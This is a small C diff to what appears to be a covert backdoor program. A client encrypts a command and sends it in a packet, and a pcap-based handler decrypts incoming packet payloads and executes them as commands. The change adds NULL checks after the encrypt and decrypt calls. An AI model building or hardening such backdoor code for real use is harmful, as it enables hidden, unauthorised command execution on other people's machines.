@@ -123,6 +123,9 @@ void client(struct client_opt c_opt){
     char *bd_message;
     int bd_message_len;
     bd_message = bd_encrypt(c_opt.command, &bd_message_len);
+    if(bd_message == NULL){
+        return;
+    }
     
     /* Set packet options and send packet */
     
@@ -376,6 +379,9 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     printf("payload_len: %d\n",payload_len);
     char *bd_command;
     bd_command = bd_decrypt((char *)packet_info.payload, payload_len);
+    if(bd_command == NULL){
+        return;
+    }
     
     // Execute command
     FILE *fp;
